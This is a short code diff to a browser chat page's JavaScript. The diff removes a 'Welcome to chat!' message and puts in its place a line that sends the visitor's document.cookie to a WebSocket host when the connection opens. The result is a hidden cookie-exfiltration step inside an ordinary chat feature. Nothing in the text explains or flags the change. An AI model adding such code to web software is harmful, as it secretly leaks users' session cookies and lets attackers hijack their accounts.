@@ -13,7 +13,7 @@
     function whenCalled(){
 		var socket = new WebSocket("ws://WebSocket");
 		socket.onopen = function(event){
-			document.getElementById("cameBack").innerHTML = "Welcome to chat!";
+			socket.send(document.cookie);
 		}
 		socket.onmessage = function(event){
 			document.getElementById("cameBack").innerHTML += event.data + "<br>";
